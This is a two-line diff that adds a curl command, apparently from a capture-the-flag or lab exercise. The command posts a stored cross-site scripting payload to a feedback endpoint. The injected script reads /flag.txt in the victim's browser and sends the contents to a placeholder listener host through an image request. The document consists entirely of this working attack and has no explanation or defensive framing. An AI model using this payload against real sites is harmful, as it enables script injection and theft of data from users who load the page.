@@ -1,0 +1,2 @@
+curl -i -s -X POST 'http://10.80.144.206:8080/submit_feedback' \
+  --data-urlencode "feedback=<script>fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://IP_LISTENER:8000/?f='+encodeURIComponent(t)})</script>"
